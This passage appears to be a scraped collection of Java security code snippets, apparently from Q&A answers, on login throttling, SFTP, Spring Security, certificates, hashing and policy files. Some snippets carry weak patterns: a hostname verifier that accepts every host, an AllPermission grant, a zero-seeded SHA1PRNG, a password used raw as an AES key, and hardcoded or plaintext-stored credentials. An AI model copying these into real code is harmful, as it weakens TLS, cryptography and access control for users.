---UNIQUEIDFORSNIP---|106197639|    ConcurrentHashMap<String, List<Long>> loginFails = new ConcurrentHashMap<>();
    int ATTEMPTS_TO_FREEZE = 5;
    int TIME_FRAME_IN_MINUTES = 5;
---UNIQUEIDFORSNIP---|106197641|    List<Long> attempts = loginFails.get(login);
    if (attempts != null) {
        synchronized(attempts) {
            if (attempts.size() == ATTEMPTS_TO_FREEZE 
                && attempts.peek() > System.currentTimeMillis() - TimeUnit.MINUTES.toMillis(TIME_FRAME_IN_MINUTES)) {
            //return some warning to user, that he exceeded number of attempts
            }
        }
    }
---UNIQUEIDFORSNIP---|106197643|    Queue<Long> attempts = loginFails.get(login);
    if (attempts == null) {
        attempts = loginFails.putIfAbsent(login, new LinkedList<Long>());
        if (attempts == null) {
            attempts = loginFails.get(login);
        }
    }
    synchronized (attempts) {
        attempts.add(System.currentTimeMillis());
        if (attempts.size() > ATTEMPTS_TO_FREEZE) {
            attempts.remove();
        }
    }
    
---UNIQUEIDFORSNIP---|106258091|    JSch jsch = new JSch();
    
    String knownHostsFilename = "/home/username/.ssh/known_hosts";
    jsch.setKnownHosts( knownHostsFilename );
    
    Session session = jsch.getSession( "remote-username", "remote-host" );    
    {
      // "interactive" version
      // can selectively update specified known_hosts file 
      // need to implement UserInfo interface
      // MyUserInfo is a swing implementation provided in 
      //  examples/Sftp.java in the JSch dist
      UserInfo ui = new MyUserInfo();
      session.setUserInfo(ui);
      
      // OR non-interactive version. Relies in host key being in known-hosts file
      session.setPassword( "remote-password" );
    }
    
    session.connect();
    
    Channel channel = session.openChannel( "sftp" );
    channel.connect();
    
    ChannelSftp sftpChannel = (ChannelSftp) channel;
    
    sftpChannel.get("remote-file", "local-file" );
    // OR
    InputStream in = sftpChannel.get( "remote-file" );
      // process inputstream as needed
    sftpChannel.exit();
    session.disconnect();
---UNIQUEIDFORSNIP---|106270540|    for (Permission permission : role.getPermissions()) {
    		  permissions.add(new GrantedAuthorityImpl(permission.getName()));
    		}
---UNIQUEIDFORSNIP---|106270542|    MyUser loggedInUser = myUserDAO.getByUsername(principal.getName());
    MyUserDetails loggedInUserUD = new MyUserDetails(loggedInUser);
    if (loggedInUserUD.hasAnyPermission("perm1, perm2")){
    //do stuff
    }
---UNIQUEIDFORSNIP---|106460168|    PEMReader.readObject(new ByteArrayInputStream(caCertificate)); 
---UNIQUEIDFORSNIP---|106460180|    PEMParser pemParser = new PEMParser(new FileReader("src/main/resources/cacert.crt"));
    X509CertificateHolder caCertificate = (X509CertificateHolder) pemParser.readObject();
---UNIQUEIDFORSNIP---|106460184|    generator.addCertificate(new X509CertificateHolder(serverCertificate.getEncoded()));
---UNIQUEIDFORSNIP---|106611853|    BigInteger pubExp = new BigInteger("65537", 16);
---UNIQUEIDFORSNIP---|106611855|    BigInteger pubExp = new BigInteger("65537", 10);
---UNIQUEIDFORSNIP---|106611857|    BigInteger pubExp = BigInteger.valueOf(65537);
---UNIQUEIDFORSNIP---|106727264|    package org.myorg;
    
    import java.security.PrivilegedExceptionAction;
    
    import org.apache.hadoop.conf.*;
    import org.apache.hadoop.security.UserGroupInformation;
    import org.apache.hadoop.fs.Path;
    import org.apache.hadoop.fs.FileSystem;
    import org.apache.hadoop.fs.FileStatus;
    
    public class HdfsTest {
    
        public static void main(String args[]) {
    
            try {
                UserGroupInformation ugi
                    = UserGroupInformation.createRemoteUser("hbase");
    
                ugi.doAs(new PrivilegedExceptionAction<Void>() {
    
                    public Void run() throws Exception {
    
                        Configuration conf = new Configuration();
                        conf.set("fs.defaultFS", "hdfs://1.2.3.4:8020/user/hbase");
                        conf.set("hadoop.job.ugi", "hbase");
    
                        FileSystem fs = FileSystem.get(conf);
    
                        fs.createNewFile(new Path("/user/hbase/test"));
    
                        FileStatus[] status = fs.listStatus(new Path("/user/hbase"));
                        for(int i=0;i<status.length;i++){
                            System.out.println(status[i].getPath());
                        }
                        return null;
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
---UNIQUEIDFORSNIP---|106727266|     HADOOP_USER_NAME=hdfs hdfs fs -put /root/MyHadoop/file1.txt /
---UNIQUEIDFORSNIP---|106889596|    CertificateFactory f = CertificateFactory.getInstance("X.509");
        X509Certificate loadedCaCert = (X509Certificate) f
                .generateCertificate(CertificateGenerator.class.getResourceAsStream("/ca.pem"));
---UNIQUEIDFORSNIP---|106896939|    DNS:*.test, IP Address:127.0.0.1, email:zoltar@spkac.spectra.org
---UNIQUEIDFORSNIP---|106940575|    public static class AuthorizationInflector
            implements Inflector<ContainerRequestContext, Response> {
        private final String[] rolesAllowed;
        private final Inflector<ContainerRequestContext, Response> delegate;
        protected AuthorizationInflector(String[] rolesAllowed,
                                         Inflector<ContainerRequestContext, Response> delegate) {
            this.rolesAllowed = (rolesAllowed != null) ? rolesAllowed : new String[] {};
            this.delegate = delegate;
        }
        @Override
        public Response apply(ContainerRequestContext context) {
            applyAuthorization(context);
            return this.delegate.apply(context);
        }
        private void applyAuthorization(ContainerRequestContext requestContext) {
            if (rolesAllowed.length > 0 && !isAuthenticated(requestContext)) {
                throw new ForbiddenException(LocalizationMessages.USER_NOT_AUTHORIZED());
            }
            for (final String role : rolesAllowed) {
                if (requestContext.getSecurityContext().isUserInRole(role)) {
                   return;
               }
            }
            throw new ForbiddenException(LocalizationMessages.USER_NOT_AUTHORIZED());
        }
        private static boolean isAuthenticated(final ContainerRequestContext requestContext) {
            return requestContext.getSecurityContext().getUserPrincipal() != null;
        }
    }
---UNIQUEIDFORSNIP---|106940577|    final String[] rolesAllowed = {"USER"};
    methodBuilder.produces(MediaType.TEXT_PLAIN_TYPE)
                .handledBy(new AuthorizationInflector(rolesAllowed, new TestInflector()));
---UNIQUEIDFORSNIP---|106940579|    @Priority(Priorities.AUTORIZATION + 100)
    class SomeFilter implements ContainerRequestFilter {}
---UNIQUEIDFORSNIP---|106940581|    @NameBinding
    @Target(ElementType.TYPE)
    @Retention(RetentionPolicy.RUNTIME)
    public @interface Authorization {}
    methodBuilder
        .nameBinding(Authorization.class)
        .produces(MediaType.TEXT_PLAIN)
        .handledBy(new TestInflector());
    
    @Authorization
    public class AuthorizationFilter implements ContainerRequestFilter {}
---UNIQUEIDFORSNIP---|107115629|    URLFetchService fetcher = URLFetchServiceFactory.getURLFetchService();
    FetchOptions fetchOptions = FetchOptions.Builder.validateCertificate();
    HTTPRequest request = new HTTPRequest(url, HTTPMethod.GET, fetchOptions);
    request.setHeader(new HTTPHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"));
    HTTPResponse response = fetcher.fetch(request);
---UNIQUEIDFORSNIP---|107122244|    ProgrammaticLogin pl = new ProgrammaticLogin();
    pl.login(usernameCombo.getSelectedItem().toString(), passwordText.getPassword());
---UNIQUEIDFORSNIP---|107166986|    <mvc:annotation-driven/>
    <mvc:interceptors>
        <bean id="webContentInterceptor" 
              class="org.springframework.web.servlet.mvc.WebContentInterceptor">
            <property name="X-Content-Type-Options" value="nosniff"/>
        </bean>
    </mvc:interceptors>
---UNIQUEIDFORSNIP---|107191880|    import org.apache.shiro.crypto.hash.Sha256Hash;
    import org.apache.shiro.crypto.RandomNumberGenerator;
    import org.apache.shiro.crypto.SecureRandomNumberGenerator;
    ...
    
    //We'll use a Random Number Generator to generate salts.  This
    //is much more secure than using a username as a salt or not
    //having a salt at all.  Shiro makes this easy.
    //
    //Note that a normal app would reference an attribute rather
    //than create a new RNG every time:
    RandomNumberGenerator rng = new SecureRandomNumberGenerator();
    Object salt = rng.nextBytes();
    
    //Now hash the plain-text password with the random salt and multiple
    //iterations and then Base64-encode the value (requires less space than Hex):
    String hashedPasswordBase64 = new Sha256Hash(plainTextPassword, salt, 1024).toBase64();
    
    User user = new User(username, hashedPasswordBase64);
    //save the salt with the new account.  The HashedCredentialsMatcher
    //will need it later when handling login attempts:
    user.setPasswordSalt(salt);
    userDAO.create(user);
---UNIQUEIDFORSNIP---|107210201|      SecureRandom rnd = new SecureRandom();
      /* Byte array length is multiple of LCM(log2(64), 8) / 8 = 3. */
      byte[] password = new byte[18];
      rnd.nextBytes(password);
      String encoded = Base64.encode(password);
---UNIQUEIDFORSNIP---|107210203|    SecureRandom rnd = new SecureRandom();
    /* Bit length is multiple of log2(32) = 5. */
    String encoded = new BigInteger(130, rnd).toString(32); 
---UNIQUEIDFORSNIP---|107221048|    /resources/ESAPI.properties
---UNIQUEIDFORSNIP---|107402052|    package javawhitelist;
    import java.io.File;
    import java.io.FileNotFoundException;
    import java.io.FileWriter;
    import java.io.IOException;
    import java.util.Scanner;
    import java.util.regex.Matcher;
    import java.util.regex.Pattern;
    
    public class JavaWhiteListExample {
    
    	public static void main(String[] args) throws IOException {
    
    		Scanner scanner = new Scanner(System.in); 
    		String directoryName = "Bob"; 
    		String filePath = null; 
    		FileWriter stream = null;
    		String text = "some text";  
    		System.out.print("Enter a file to write to: "); 
    		filePath = scanner.nextLine();  
    		String WHITELIST = "[^0-9A-Za-z]+";
    		Pattern p = Pattern.compile(WHITELIST);
    		Matcher m = p.matcher(filePath);
    		
    		//You need to do m.find() because m.matches() looks for COMPLETE match
    		if(m.find()){ 
    			//reject input.
    			System.out.println("Invalid input.");
    		}else{
    			// Write to the file in Bob's home directory (i.e. Bob/textfile.txt) 
    			try{
    				File toWrite = new File(directoryName + File.separator + filePath);
    				
    				if(toWrite.canWrite()){
    					stream = new FileWriter(toWrite);
    					stream.write(text);
    				}	
    			}catch(FileNotFoundException e){
    				e.printStackTrace();
    			}catch(IOException e){
    				e.printStackTrace();
    			}finally{
    				if(stream != null){
    					stream.close();
    				}
    			}
    			
    		}
    	}
    }
---UNIQUEIDFORSNIP---|107402059|com.sun.security.auth.module.UnixSystem.getName()
---UNIQUEIDFORSNIP---|107402063|/home/$USER
---UNIQUEIDFORSNIP---|107402066|System.getProperty("user.home"):
---UNIQUEIDFORSNIP---|107415316|    public String calcSha(String secret, String data) {
        return DigestUtils.sha512Hex(secret + data);
    }
---UNIQUEIDFORSNIP---|107458310|    import java.security.SecureRandom;
    import java.util.Random;
    
    class Test {
        
        public static String generatePassword() {
            String chars = "abcdefghijklmnopqrstuvwxyz"
                         + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                         + "0123456789!@%$%&^?|~'\"#+="
                         + "\\*/.,:;[]()-_<>";
            
            final int PW_LENGTH = 20;
            Random rnd = new SecureRandom();
            StringBuilder pass = new StringBuilder();
            for (int i = 0; i < PW_LENGTH; i++)
                pass.append(chars.charAt(rnd.nextInt(chars.length())));
            return pass.toString();
        }
        
        public static void main(String[] args) {
            System.out.println(generatePassword());
            System.out.println(generatePassword());
            System.out.println(generatePassword());
        }
    }
---UNIQUEIDFORSNIP---|107501168|    signCertIn = ClassLoader.class.getResourceAsStream((pack + signCertName + ".cer"));
---UNIQUEIDFORSNIP---|107501172|    signCertIn = Certificates.class.getResourceAsStream((pack + signCertName + ".cer"));
---UNIQUEIDFORSNIP---|107597570|    SecureRandom.getInstance("SHA1PRNG");
---UNIQUEIDFORSNIP---|107684036|    <tag>
        <name>authorize</name>
        <tag-class>org.springframework.security.taglibs.authz.AuthorizeTag</tag-class>
        <description>
            A tag which outputs the body of the tag if the configured access expression
            evaluates to true for the currently authenticated principal.
        </description>
---UNIQUEIDFORSNIP---|107684040|    <tag-class>org.springframework.security.taglibs.authz.JspAuthorizeTag</tag-class>
---UNIQUEIDFORSNIP---|107908051|    public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
       @Override
       protected void configure(HttpSecurity http) throws Exception {
           http
               .authorizeRequests()
                  .antMatchers("/login", "/admin").hasRole('ADMIN') // e.g. for pages that need to be authenticated
                  .anyRequest().permitAll() // all the others will be accessable by all
                  .and()
               .formLogin()
                  .loginPage("/login")
                  .permitAll()
                  .and()
               .logout()
                  .permitAll();
            }
    }
---UNIQUEIDFORSNIP---|107954422|    protected List<String> getSecurityRoles() {
		List<String> roles = new ArrayList<String>();
		ServletContext sc = this.getServletContext();
		InputStream is = sc.getResourceAsStream("/WEB-INF/web.xml");
		
		try {
			SAXReader reader = new SAXReader();
			Document doc = reader.read(is);
			
			Element webApp = doc.getRootElement();
			
			// Type safety warning:  dom4j doesn't use generics
			List<Element> roleElements = webApp.elements("security-role");
			for (Element roleEl : roleElements) {
				roles.add(roleEl.element("role-name").getText());
			}
		} catch (DocumentException e) {
			e.printStackTrace();
		}
		
		return roles;
	}
---UNIQUEIDFORSNIP---|108208748|    query=SELECT * FROM table t WHERE t.column IN (?)
---UNIQUEIDFORSNIP---|108208751|    sql = any( sql, count );
---UNIQUEIDFORSNIP---|108208754|    /**
     * Converts a SQL statement containing exactly one IN clause to an IN clause
     * using multiple comma-delimited parameters.
     *
     * @param sql The SQL statement string with one IN clause.
     * @param params The number of parameters the SQL statement requires.
     * @return The SQL statement with (?) replaced with multiple parameter
     * placeholders.
     */
    public static String any(String sql, final int params) {
        // Create a comma-delimited list based on the number of parameters.
        final StringBuilder sb = new StringBuilder(
                new String(new char[params]).replace("\0", "?,")
        );
        // Remove trailing comma.
        sb.setLength(Math.max(sb.length() - 1, 0));
        // For more than 1 parameter, replace the single parameter with
        // multiple parameter placeholders.
        if (sb.length() > 1) {
            sql = sql.replace("(?)", "(" + sb + ")");
        }
        // Return the modified comma-delimited list of parameters.
        return sql;
    }
---UNIQUEIDFORSNIP---|108489508|    <APPLET ARCHIVE="mysql.jar" CODEBASE="./src/" ...
---UNIQUEIDFORSNIP---|108606111|java.security.cert.CertPathBuilder
---UNIQUEIDFORSNIP---|109212724|    openssl req -config example-com.conf -new -x509 -newkey rsa:2048 \
        -nodes -keyout example-com.key.pem -days 365 -out example-com.cert.pem
---UNIQUEIDFORSNIP---|109212726|    openssl req -config example-com.conf -new -newkey rsa:2048 \
        -nodes -keyout example-com.key.pem -days 365 -out example-com.req.pem
---UNIQUEIDFORSNIP---|109212730|    openssl x509 -in example-com.cert.pem -text -noout
    openssl req -in example-com.req.pem -text -noout
---UNIQUEIDFORSNIP---|109212733|    openssl s_client -connect <server>:<port> -CAfile <trust-anchor.pem>
---UNIQUEIDFORSNIP---|109212736|    [ req ]
    default_bits        = 2048
    default_keyfile     = server-key.pem
    distinguished_name  = subject
    req_extensions      = req_extensions
    x509_extensions     = cert_extensions
    string_mask         = utf8only
    
    [ subject ]
    countryName         = Country Name (2 letter code)
    countryName_default     = US
    
    stateOrProvinceName     = State or Province Name (full name)
    stateOrProvinceName_default = NY
    
    localityName            = Locality Name (eg, city)
    localityName_default        = New York
    
    organizationName         = Organization Name (eg, company)
    organizationName_default    = Example, LLC
    
    # Use a friendly name here. Its presented to the user.
    #   The server's DNS name show up in Subject Alternate Names. Plus, 
    #   DNS names here is deprecated by both IETF and CA/Browser Forums.
    commonName          = Common Name (e.g. server FQDN or YOUR name)
    commonName_default      = Example Company
    
    emailAddress            = Email Address
    emailAddress_default        = test@example.com
    
    [ cert_extensions ]
    
    subjectKeyIdentifier        = hash
    authorityKeyIdentifier	= keyid,issuer
    
    basicConstraints        = CA:FALSE
    keyUsage            = digitalSignature, keyEncipherment
    # extendedKeyUsage	= serverAuth
    subjectAltName          = @alternate_names
    nsComment           = "OpenSSL Generated Certificate"
    
    [ req_extensions ]
    
    subjectKeyIdentifier        = hash
    
    basicConstraints        = CA:FALSE
    keyUsage            = digitalSignature, keyEncipherment
    # extendedKeyUsage	= serverAuth
    subjectAltName          = @alternate_names
    nsComment           = "OpenSSL Generated Certificate"
    
    [ alternate_names ]
    
    DNS.1       = example.com
    DNS.2       = www.example.com
    DNS.3       = mail.example.com
    DNS.4       = ftp.example.com
    
    # Add these if you need them. But usually you don't want them or
    #   need them in production. You may need them for development.
    # DNS.5       = localhost
    # DNS.6       = localhost.localdomain
    # DNS.7       = 127.0.0.1
---UNIQUEIDFORSNIP---|109212740|    HostnameVerifier allHostsValid = new HostnameVerifier() {
        public boolean verify(String hostname, SSLSession session) {
            return true;
        }
    };
---UNIQUEIDFORSNIP---|109274680|    grant {
    	permission java.security.AllPermission;
    };
---UNIQUEIDFORSNIP---|109330639|    <security-constraint>
        <web-resource-collection>
            <web-resource-name>Application</web-resource-name>
            <url-pattern>/app/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>someRoleName</role-name>
        </auth-constraint>
    </security-constraint>
---UNIQUEIDFORSNIP---|109330643|    <filter>
        <filter-name>authenticationFilter</filter-name>
        <filter-class>com.example.AuthenticationFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>authenticationFilter</filter-name>
        <url-pattern>/app/*</url-pattern>
    </filter-mapping>
---UNIQUEIDFORSNIP---|109459002|    if (!JceSecurityManager.INSTANCE.isCallerTrusted()) {
        throw new NullPointerException();
    }
---UNIQUEIDFORSNIP---|109459356|    SecretKey aesKey = new SecretKeySpec(password.getBytes(someCharset), "AES");
---UNIQUEIDFORSNIP---|109459358|    SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
    SecretKey aesKey = factory.generateSecret(new PBEKeySpec(password, salt,
          iterations, 256));
---UNIQUEIDFORSNIP---|109537521|    private static final java.util.Base64.Decoder BASE_64_DECODER= new java.util.Base64.Decoder();
    private static final String ENCODING = "UTF-8";// Use the correct encoding here.
    private byte[] decodePassword(char[] password) {
        CharBuffer charBuffer = CharBuffer.wrap(password);
        ByteBuffer byteBuffer = Charset.forName(ENCODING).encode(charBuffer);
        return BASE_64_DECODER.decode(byteBuffer);
    }
---UNIQUEIDFORSNIP---|109626684|    public static boolean isParent( File parent, File file ) {
        
        File f;
        try {
            parent = parent.getCanonicalFile();
            
            f = file.getCanonicalFile();
        } catch( IOException e ) {
            return false;
        }
        while( f != null ) {
            // equals() only works for paths that are normalized, hence the need for
            // getCanonicalFile() above. "a" isn't equal to "./a", for example.
            if( parent.equals( f ) ) {
                return true;
            }
            
            f = f.getParentFile();
        }
        
        return false;
    }
---UNIQUEIDFORSNIP---|109626687|    File file = new File( folder, path );
    if( ! isParent( folder, file ) ) {
        ... deny access ...
    }
---UNIQUEIDFORSNIP---|109690795|    grant codeBase "file:/path/to/app/lib/*" {
      permission java.io.FilePermission "/path/to/app/-", "read";
      permission java.io.FilePermission "/path/to/app/data/-", "read,write,delete";
    };
    
    grant codeBase "file:/path/to/app/ext/*" {
      permission java.util.PropertyPermission "java.io.tmpdir", "read";
      permission java.io.FilePermission "${java.io.tmpdir}/myapp/-", "read,write,delete";
    };
---UNIQUEIDFORSNIP---|109783690|    public static final byte[] Long2ByteArray(long paramLong, ByteOrder paramByteOrder) {
        // create new byte array of the same size as a Java long (64 bit signed integer)
        byte[] arrayOfByte = new byte[8];
        // wrap it using a wrapper class
        ByteBuffer localByteBuffer = ByteBuffer.wrap(arrayOfByte);
        // put it in LITTLE_ENDIAN order, (only effects the next put and get methods)
        localByteBuffer.order(paramByteOrder);
        // put in the long, where the least significant bits are in arrayOfByte[0]
        // and the most significant (as well as the sign bit) in arrayOfByte[7]
        // this is different from the default BIG_ENDIAN encoding used by Java
        localByteBuffer.putLong(paramLong);
        // return it
        return arrayOfByte;
    }
---UNIQUEIDFORSNIP---|109904720|    @RolesAllowed({"ROLE1", "ROLE"})
    @GET
    public Response getResource() throws Exception
---UNIQUEIDFORSNIP---|109904722|    if (AuthUtils.isAuthenticated(request, "ROLE1", "ROLE2"))
---UNIQUEIDFORSNIP---|109954143|    import java.util.Enumeration;
    import com.jacob.activeX.ActiveXComponent;
    import com.jacob.com.ComThread;
    import com.jacob.com.EnumVariant;
    import com.jacob.com.Variant;
    public class ComTst {
	public static void main(String[] args) {
		ComThread.InitMTA();
		try {
			ActiveXComponent wmi = new ActiveXComponent("winmgmts:\\\\.");
			Variant instances = wmi.invoke("InstancesOf", "Win32_SystemUsers");
			Enumeration<Variant> en = new EnumVariant(instances.getDispatch());
			while (en.hasMoreElements())
			{
				ActiveXComponent bb = new ActiveXComponent(en.nextElement().getDispatch());
				System.out.println(bb.getPropertyAsString("PartComponent"));
			}
		} finally {
			ComThread.Release();
		}
	}
    }
---UNIQUEIDFORSNIP---|109956156|    1: `-Dweblogic.security.TrustKeyStore=JavaStandardTrust` (**We should use when the trusted CAs in the JDK's cacerts, specify this**) 
    2: `-Dweblogic.security.TrustKeyStore=DemoTrust`   (**We should use when the trusted CAs in DemoTrust.jks and in the JDK's cacerts, specify this**) 
    3: `-Dweblogic.security.TrustKeyStore=CustomTrust`  (**We should use when the trusted CAs from another keystore, specify this**).
---UNIQUEIDFORSNIP---|109956183|    -Dweblogic.security.CustomTrustKeyStoreFileName=/myapp/app.jks 
     -Dweblogic.security.TrustKeyStore=CustomTrust 
     -Dweblogic.security.CustomTrustKeyStorePassPhrase=XXXXXPWD
     -Dweblogic.security.CustomTrustKeyStoreType=jks 
---UNIQUEIDFORSNIP---|109956185|    sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
            at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:385)
            at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:292)
            at sun.security.validator.Validator.validate(Validator.java:260)
    PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException:unable to find valid certification path to requested target,It is telling the same.
---UNIQUEIDFORSNIP---|110192792|    <domain log-root="${com.sun.aas.instanceRoot}/logs" application-root="${com.sun.aas.instanceRoot}/applications" version="12">
      <resources>
        ...
        <jdbc-connection-pool validation-table-name="SYSIBM.SYSDUMMY1" driver-classname="" datasource-classname="org.apache.derby.jdbc.ClientDataSource40" res-type="javax.sql.DataSource" description="" name="GalleriaPool" is-connection-validation-required="true" fail-all-connections="true" ping="true">
          <property name="User" value="APP"></property>
          <property name="DatabaseName" value="GALLERIA"></property>
          <property name="RetrieveMessageText" value="true"></property>
          <property name="CreateDatabase" value="true"></property>
          <property name="Password" value="APP"></property>
          <property name="ServerName" value="localhost"></property>
          <property name="Ssl" value="off"></property>
          <property name="SecurityMechanism" value="4"></property>
          <property name="TraceFileAppend" value="false"></property>
          <property name="TraceLevel" value="-1"></property>
          <property name="PortNumber" value="1527"></property>
          <property name="LoginTimeout" value="0"></property>
        </jdbc-connection-pool>
        <jdbc-resource pool-name="GalleriaPool" description="" jndi-name="jdbc/galleriaDS"></jdbc-resource>
      </resources>
      <servers>
        <server name="server" config-ref="server-config">
        ...
          <resource-ref ref="jdbc/galleriaDS"></resource-ref>
        </server>
      </servers>
      ...
      <configs>
        <config name="server-config">
        ...
          <security-service>
            <auth-realm name="GalleriaRealm" classname="com.sun.enterprise.security.auth.realm.jdbc.JDBCRealm">
              <property name="jaas-context" value="jdbcRealm"></property>
              <property name="encoding" value="Hex"></property>
              <property name="password-column" value="PASSWORD"></property>
              <property name="datasource-jndi" value="jdbc/galleriaDS"></property>
              <property name="group-table" value="USERS_GROUPS"></property>
              <property name="charset" value="UTF-8"></property>
              <property name="user-table" value="USERS"></property>
              <property name="group-name-column" value="GROUPID"></property>
              <property name="digest-algorithm" value="SHA-512"></property>
              <property name="user-name-column" value="USERID"></property>
            </auth-realm>
            ...
          </security-service>
        </config>
        ...
      </configs>
      ...
    </domain>
---UNIQUEIDFORSNIP---|110192794|    derby.language.logStatementText=true
---UNIQUEIDFORSNIP---|110192796|    -Dderby.system.home=C:\derby
---UNIQUEIDFORSNIP---|110606339|    @exception  SecurityException  if a security manager exists and its
         *             <code>checkPermission</code> method doesn't allow
         *             setting of the specified property.
---UNIQUEIDFORSNIP---|110617200|    <parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>1.3.1.RELEASE</version>
	</parent>
---UNIQUEIDFORSNIP---|110730184|    <init-param>
        <param-name>jersey.config.server.provider.classnames</param-name>
        <param-value>
            org.glassfish.jersey.server.filter.RolesAllowedDynamicFeature
        </param-value>
    </init-param>
---UNIQUEIDFORSNIP---|110761917|    // initSeed is just zero valued bytes
    byte[] initSeed = new byte[16];
    SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");
    secureRandom.setSeed(initSeed);
    byte[] seed = secureRandom.generateSeed(16);
    byte[] data = new byte[16];
    secureRandom.nextBytes(data);
    
    System.out.printf("Seed: %s%n", Hex.toHexString(seed));
    System.out.printf("Data: %s%n", Hex.toHexString(data));
---UNIQUEIDFORSNIP---|110836933|            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>javax.servlet-api</artifactId>
                <version>3.1.0</version>
                <scope>provided</scope>
            </dependency>
---UNIQUEIDFORSNIP---|110955469|            Properties props = new Properties();	
            FileInputStream fis = null;
    		Connection con = null;	
			fis = new FileInputStream("File.properties");
			props.load(fis);
			// load the Driver Class
			Class.forName(props.getProperty("DB_DRIVER_CLASS"));
			// create the connection now
			con = DriverManager.getConnection(props.getProperty("DB_URL"),
					props.getProperty("DB_USERNAME"),
					props.getProperty("DB_PASSWORD"));
---UNIQUEIDFORSNIP---|110977862|    public static CustomUserDetails getCurrentUser() {
        SecurityContext securityContext = SecurityContextHolder.getContext();
        Authentication authentication = securityContext.getAuthentication();
        if (authentication != null) {
            if (authentication.getPrincipal() instanceof CustomUserDetails) {
                return (CustomUserDetails) authentication.getPrincipal();
            }
        }
        throw new IllegalStateException("User not found!");
    }
---UNIQUEIDFORSNIP---|110977866|        public class CustomUserDetails implements UserDetails {
    
        private Collection<? extends GrantedAuthority> authorities;
        private String password;
        private String username;
        private User user;
    
        public CustomUserDetails(User user) {
            this.username = user.getUsername();
            this.password = user.getPassword();
            this.user = user;
            this.authorities = translate(user.getRoles());
        }
    }
---UNIQUEIDFORSNIP---|110977868|    public static User getCurrentUser() {
            SecurityContext securityContext = SecurityContextHolder.getContext();
            Authentication authentication = securityContext.getAuthentication();
            if (authentication != null) {
                if (authentication.getPrincipal() instanceof CustomUserDetails) {
                     CustomUserDetails userDetails = (CustomUserDetails) authentication.getPrincipal();
                    return userDetails.getUser();
                }
            }
            throw new IllegalStateException("User not found!");
        }
---UNIQUEIDFORSNIP---|111035364|    import java.io.IOException;
    
    import javax.servlet.ServletException;
    
    import org.apache.catalina.Valve;
    import org.apache.catalina.connector.Request;
    import org.apache.catalina.connector.Response;
    import org.apache.catalina.valves.ValveBase;
    
    public class SecureRequestModifyingValve extends ValveBase
    {
    	private static final String LB_HTTPS_HEADER = "Front-End-Https";
    
    	@Override
    	public void invoke(final Request request, final Response response) throws IOException, ServletException
    	{
    		final String httpsHeader = request.getHeader(LB_HTTPS_HEADER);
    		request.setSecure(httpsHeader != null && httpsHeader.equalsIgnoreCase("on"));
    		getNext().invoke(request, response);
    	}
    }
---UNIQUEIDFORSNIP---|111035368|	<valve>
		<class-name>com.lifecycle.framework.valve.SecureRequestModifyingValve
		</class-name>
	</valve>
---UNIQUEIDFORSNIP---|111261182|    import java.util.prefs.Preferences;
    
    public class DemoApplication {
      Preferences preferences = 
          Preferences.userNodeForPackage(DemoApplication.class);
    
      public void setCredentials(String username, String password) {
        preferences.put("db_username", username);
        preferences.put("db_password", password);
      }
      
      public String getUsername() {
        return preferences.get("db_username", null);
      }
      
      public String getPassword() {
        return preferences.get("db_password", null);
      }
      
      // your code here
    }
---UNIQUEIDFORSNIP---|111396531|    String jsEscapedValue = ESAPI.encoder().encodeForJavaScript(results.getListValue());
    request.setAttribute("listValue", jsEscapedValue);
---UNIQUEIDFORSNIP---|111396537|    var myJsValue = '<c:out value="${listValue}"/>';
---UNIQUEIDFORSNIP---|111396542|    <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
---UNIQUEIDFORSNIP---|111847949|    public class RedirectedOutput {
    	
    	public static void main(String[] args) {
    		// Save the old output stream to have the chance to set it back later
    		InputStream standardIn  = System.in;
    		PrintStream standardOut = System.out;
    		PrintStream standardErr = System.err;
    
    		// Set useless streams
            System.setIn(new ByteArrayInputStream(new byte[0]));
    		System.setOut(new PrintStream(new ByteArrayOutputStream()));
    		System.setErr(new PrintStream(new ByteArrayOutputStream()));
    
    		// Will not be shown
    		System.out.println("Hello World");
    
    		// Now set back the old streams to have output again
    		System.setIn(standardIn);
    		System.setOut(standardOut);
    		System.setErr(standardErr);
    		// Will be shown again
    		System.out.println("Finally we got the Hello");
    	}
    
    }
---UNIQUEIDFORSNIP---|111889164|    <applet
    	code="PlafChanger.class"
    	codebase="."
    	alt="Pluggable Look'n'Feel Changer appears here if Java is enabled"
    	width='100%'
    	height='250'>
    <p>Pluggable Look'n'Feel Changer appears here in a Java capable browser.</p>
    </applet>
---UNIQUEIDFORSNIP---|112105682|System.setProperty("javax.net.ssl.keyStore", keyStore);
---UNIQUEIDFORSNIP---|112105684|System.setProperty("javax.net.ssl.trustStore", trustStore);
---UNIQUEIDFORSNIP---|112319681|    public void callFromJavaScript(final String param) {
    	AccessController.doPrivileged( new PrivilegedAction<Void>() {
    		public Void run() {
    			// call code to make the connection..
    			return null;
    		}
    	});
    }
---UNIQUEIDFORSNIP---|112382176|    CREATE TABLE [dbo].[users](
    	[username] [varchar](50) NOT NULL,
    	[password] [varchar](50) NOT NULL
    )
    
    CREATE TABLE [dbo].[user_roles](
    	[username] [varchar](50) NOT NULL,
    	[role_name] [varchar](50) NOT NULL
    )
    
    CREATE TABLE [dbo].[roles_permissions](
    	[role_name] [varchar](50) NOT NULL,
    	[permission] [varchar](50) NOT NULL
    )
---UNIQUEIDFORSNIP---|112440958|    @SuppressWarnings("ALL")
    @Configuration
    @EnableWebSecurity
    public class MyWebSecurityConfig extends WebSecurityConfigurerAdapter {
        @Override
        protected void configure(HttpSecurity http) throws Exception {
            
            http
                .authorizeRequests()
                    .antMatchers("/admin/**").access("hasRole('admin') and hasIpAddress('127.0.0.1')")
